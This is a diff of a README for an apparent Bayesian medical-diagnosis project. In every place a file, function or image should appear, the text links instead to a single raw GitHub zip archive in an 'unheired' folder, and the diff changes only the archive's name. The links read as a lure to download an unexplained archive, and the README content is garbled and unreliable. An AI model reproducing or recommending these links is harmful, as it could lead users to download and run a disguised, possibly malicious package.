@@ -21,7 +21,7 @@ This system integrates **Natural Language Processing (spaCy)**, **Graph Database
   - Calculates disease probabilities based on given symptoms
 
 - **Fuzzy Matching for Symptoms**
-  - Mistyped or unknown symptoms are corrected using `https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip()`
+  - Mistyped or unknown symptoms are corrected using `https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian_ai_medical_2.6.zip()`
 
 - **Neo4j Graph Representation**
   - Visualizes disease-symptom relationships
@@ -51,11 +51,11 @@ Cold – 0.52
 ## 🗃️ Project Structure
 
 bayesian-medical-ai/
-├── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip # Main inference engine
-├── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip # Example test cases & helper UI
-├── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip # Knowledge loader from text file
+├── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian_ai_medical_2.6.zip # Main inference engine
+├── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian_ai_medical_2.6.zip # Example test cases & helper UI
+├── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian_ai_medical_2.6.zip # Knowledge loader from text file
 ├── assets/ # Screenshots, diagrams
-└── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip
+└── https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian_ai_medical_2.6.zip
 
 
 ---
@@ -82,7 +82,7 @@ bayesian-medical-ai/
 
 ## Architecture Diagram
 
-<img width="1200" height="600" alt="model image" src="https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian-medical-ai.zip" />
+<img width="1200" height="600" alt="model image" src="https://raw.githubusercontent.com/Arfa01/bayesian-medical-ai/main/unheired/bayesian_ai_medical_2.6.zip" />
 
 ---
 
